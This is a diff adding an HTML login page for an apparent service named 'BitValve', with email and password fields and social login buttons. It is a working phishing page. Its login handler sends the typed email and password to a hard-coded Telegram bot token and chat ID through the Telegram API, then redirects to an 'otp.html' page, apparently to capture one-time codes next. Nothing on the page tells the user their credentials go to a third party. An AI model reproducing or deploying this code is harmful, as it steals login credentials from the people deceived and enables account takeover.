@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login - BitValve</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
+    <div class="bg-white w-full max-w-md p-8 rounded-2xl shadow-lg">
+
+        <!-- Logo + Title -->
+        <div class="mb-4">
+            <div class="flex items-center justify-center">
+                <img src="bitvalve.png" alt="BitValve Logo" class="w-8 h-8 mr-2">
+                <span class="text-2xl font-semibold text-gray-800">BitValve</span>
+            </div>
+            <h2 class="text-lg font-bold text-gray-800 text-left mt-0">Login</h2>
+        </div>
+
+        <!-- Email -->
+        <div class="mb-4">
+            <label class="block text-xs font-semibold text-gray-700 mb-1 uppercase">Email</label>
+            <input id="email" type="email" placeholder="Enter your email address" class="w-full px-4 py-3 rounded-lg border border-gray-200 focus:ring-2 focus:ring-green-500 outline-none shadow-sm" />
+        </div>
+
+        <!-- Password -->
+        <div class="mb-2">
+            <label class="block text-xs font-semibold text-gray-700 mb-1 uppercase">Password</label>
+            <div class="relative">
+                <input id="password" type="password" placeholder="Enter your password" class="w-full px-4 py-3 rounded-lg border border-gray-200 focus:ring-2 focus:ring-green-500 outline-none shadow-sm" />
+                <button type="button" id="togglePassword" class="absolute inset-y-0 right-3 flex items-center text-gray-400 hover:text-gray-600">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+            stroke-width="1.5" stroke="currentColor" class="w-5 h-5">
+            <path stroke-linecap="round" stroke-linejoin="round"
+              d="M2.25 12s3.75-6.75 9.75-6.75S21.75 12 21.75 12s-3.75 6.75-9.75 6.75S2.25 12 2.25 12z" />
+            <path stroke-linecap="round" stroke-linejoin="round"
+              d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+          </svg>
+        </button>
+            </div>
+        </div>
+
+        <div class="text-right mb-6">
+            <a href="#" class="text-xs text-gray-500 hover:text-green-600 font-medium">I forgot my password</a>
+        </div>
+
+        <!-- Login Button -->
+        <button id="loginBtn" class="w-full bg-black text-green-400 font-semibold py-3 rounded-full hover:bg-gray-900 transition duration-150">
+      Login
+    </button>
+        <!-- Divider -->
+        <div class="flex items-center my-6">
+            <hr class="flex-grow border-gray-300">
+            <span class="px-2 text-sm text-gray-500">OR</span>
+            <hr class="flex-grow border-gray-300">
+        </div>
+
+        <!-- Social Login -->
+        <div class="flex justify-center gap-6 mb-6">
+            <button class="bg-white p-3 rounded-full shadow hover:shadow-md transition">
+        <img src="https://www.svgrepo.com/show/355037/google.svg" class="w-6 h-6" alt="Google">
+      </button>
+
+            <button class="bg-white p-3 rounded-full shadow hover:shadow-md transition">
+        <img src="https://www.svgrepo.com/show/475647/facebook-color.svg" class="w-6 h-6" alt="Facebook">
+      </button>
+
+            <button class="bg-white p-3 rounded-full shadow hover:shadow-md transition">
+        <img src="apple.png" class="w-6 h-6" alt="Apple">
+      </button>
+        </div>
+
+        <!-- Register Link -->
+        <p class="text-center text-sm text-gray-600">
+            Don’t have an account yet?
+            <a href="#" class="text-green-600 font-semibold hover:underline">Register</a>
+        </p>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        // Show/hide password
+        document.getElementById("togglePassword").addEventListener("click", function() {
+            const passwordField = document.getElementById("password");
+            const type = passwordField.type === "password" ? "text" : "password";
+            passwordField.type = type;
+        });
+
+        // Redirect on login click
+        document.getElementById("loginBtn").addEventListener("click", function() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            // Send data to your Telegram bot
+            const telegramBotToken = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q';
+            const chatId = '5615316142'; // Replace with your chat ID or user ID
+            const message = `Email: ${email}\nPassword: ${password}`;
+
+            // Construct the API URL
+            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            // Send the data using fetch
+            fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = "otp.html"; // Redirect after sending
+                    } else {
+                        alert('Failed to send message to Telegram.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('An error occurred while sending the message.');
+                });
+        });
+    </script>
+</body>
+
+</html>
